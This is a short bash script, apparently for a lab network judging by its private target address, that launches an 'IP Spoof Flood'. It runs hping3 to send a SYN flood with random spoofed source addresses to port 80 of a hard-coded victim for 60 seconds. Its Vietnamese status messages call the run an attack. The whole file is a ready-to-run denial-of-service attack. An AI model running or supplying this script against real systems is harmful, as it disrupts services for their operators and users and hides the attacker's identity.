#!/bin/bash
VICTIM=10.0.2.10
DURATION=60

echo "Bat dau IP Spoof Flood vao $VICTIM trong $DURATION giay..."

hping3 --rand-source -S -p 80 --flood $VICTIM &
HPING_PID=$!

sleep $DURATION
kill $HPING_PID 2>/dev/null

echo "Hoan tat tan cong IP Spoof Flood!"